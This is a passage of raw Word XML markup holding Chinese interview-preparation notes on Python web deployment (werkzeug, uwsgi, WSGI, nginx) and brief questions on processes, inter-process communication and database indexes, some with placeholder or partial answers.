          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务器，也不是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>框架，而是一个工具包，官方的介绍说是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> WSGI </w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>工具包，它可以作为一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Web </w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>框架的底层库，因为它封装好了很多</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Web </w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>框架的东西，</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>werkzeug,</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>本质上就是编写一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>socket</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务端，用于接收用户请求</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(flask)</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，和</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>wsgiref</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是类似的。</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>flask</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>框架实现服务端与客户端的通信</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>基于</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>werzeug)</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C4CBDF" w14:textId="77777777" w:rsidR="00724573" w:rsidRPr="00C045E4" w:rsidRDefault="00724573" w:rsidP="00C045E4">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：是一种线路协议，是</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服务器的独占协议，用于定义传输信息的类型（</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>type of information</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>），每一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">uwsgi packet </w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>前</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>4byte</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>为传输信息类型的描述，与</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>协议是两种东西。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06CE0427" w14:textId="77777777" w:rsidR="00724573" w:rsidRPr="00C045E4" w:rsidRDefault="00724573" w:rsidP="00C045E4">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是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务器，它实现了</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>协议、</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w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>等协议。</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Nginx</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HttpUwsgiModule</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的作用是与</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服务器进行交换。</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>项目部署实际上是</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，他才是</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务器，而不是</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43999515" w14:textId="5EE4457F" w:rsidR="00724573" w:rsidRPr="00C045E4" w:rsidRDefault="00724573" w:rsidP="00C045E4">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C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>有了</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为什么还需要</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>nginx</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>？因为</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>nginx</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>具备优秀的静态内容处理能力，然后将动态内容转发给</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服务器，这样可以达到很好的客户端响应。支持的并发量更高，方便管理多进程，发挥多核的优势，提升性能。这时候</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>nginx</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</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之间的沟通就要用到</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>uwsgi</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>协议。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F23C458" w14:textId="28FE6C9D" w:rsidR="001E7149" w:rsidRPr="00C045E4" w:rsidRDefault="001E7149" w:rsidP="00C045E4">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>20.</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>什么是</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>wsgi</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A3022D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是web服务网关接口，是一套协议。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B52E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是通过以下模块实现了wsgi协议：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68C2FEC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wsgiref</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB45F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werkzurg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C630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uwsgi   关于部署</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="733B0D2C" w14:textId="7EA7CA38" w:rsidR="00F0460B" w:rsidRPr="0028142F" w:rsidRDefault="001E7149" w:rsidP="0028142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以上模块本质：编写socket服务端，用于监听请求，当有请求到来，则将请求数据进行封装，然后交给web框架处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="265F7D74" w14:textId="0D0AC49A" w:rsidR="0028142F" w:rsidRPr="0028142F" w:rsidRDefault="0028142F" w:rsidP="00F0460B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>21</w:t>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多进程和多线程的区别</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32EF56FC" w14:textId="0605C4E7" w:rsidR="00F0460B" w:rsidRPr="0028142F" w:rsidRDefault="00F0460B" w:rsidP="0028142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8142F">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>答：巴拉巴拉</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34551E52" w14:textId="2F07F728" w:rsidR="0028142F" w:rsidRDefault="0028142F" w:rsidP="00F0460B">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>022</w:t>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进程之间怎么通信</w:t>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ab/>
      </w:r>
      <w:r w:rsidR="00F0460B">
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00F0460B">
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E8D8EA" w14:textId="7125059C" w:rsidR="00F0460B" w:rsidRPr="0028142F" w:rsidRDefault="00F0460B" w:rsidP="0028142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8142F">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>答：队列或管道</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED1C5DC" w14:textId="152B8EE8" w:rsidR="0028142F" w:rsidRDefault="0028142F" w:rsidP="00F0460B">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>023</w:t>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索引有哪些</w:t>
      </w:r>
      <w:r w:rsidR="00F0460B" w:rsidRPr="0028142F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:tab/>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ab/>
      </w:r>
      <w:r w:rsidR="00F0460B">
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E185D7" w14:textId="01144F80" w:rsidR="00F0460B" w:rsidRPr="0028142F" w:rsidRDefault="00F0460B" w:rsidP="0028142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8142F">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>答：只回答了主键索引，唯一索引</w:t>
      </w:r>
      <w:r w:rsidRPr="0028142F">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8E742D" w14:textId="51F9CD26" w:rsidR="0028142F" w:rsidRPr="0028142F" w:rsidRDefault="0028142F" w:rsidP="00F0460B">
      <w:pPr>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024</w:t>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你在</w:t>
      </w:r>
      <w:r w:rsidR="00F0460B" w:rsidRPr="0028142F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>orm</w:t>
      </w:r>
      <w:r w:rsidR="00F0460B" w:rsidRPr="0028142F">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
